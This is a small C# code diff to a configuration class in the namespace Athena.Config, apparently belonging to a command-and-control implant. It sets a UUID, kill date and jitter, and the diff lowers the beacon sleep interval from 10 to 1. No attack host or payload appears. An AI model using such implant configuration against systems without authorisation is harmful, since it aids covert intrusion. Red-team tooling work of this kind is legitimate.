@@ -23,7 +23,7 @@ namespace Athena.Config
             this.uuid = "a27e858d-1465-4216-9b30-671543effb33";
             DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
             this.killDate = kd;
-            int sleep = int.TryParse("10", out sleep) ? sleep : 60;
+            int sleep = int.TryParse("1", out sleep) ? sleep : 60;
             this.sleep = sleep;
             int jitter = int.TryParse("1", out jitter) ? jitter : 10;
             this.jitter = jitter;
